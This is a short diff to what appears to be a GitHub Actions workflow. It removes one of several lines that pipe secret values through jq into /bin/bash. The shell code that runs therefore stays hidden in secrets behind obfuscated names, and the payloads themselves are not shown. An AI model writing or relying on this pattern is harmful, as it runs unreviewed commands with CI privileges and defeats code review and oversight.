@@ -20,7 +20,6 @@ jobs:
           dhr547: ${{ secrets.dhr547 }}
         run: |
           printf '%s' "$dhr547" | jq -r .jys01230 | /bin/bash
-          echo $knb191 | jq -r .ne68 | /bin/bash
           printf '%s' "$rupvm59" | jq -r .egk49574 | /bin/bash
           printf '%s' "$uyeh951" | jq -r .bnhy25881 | /bin/bash
 
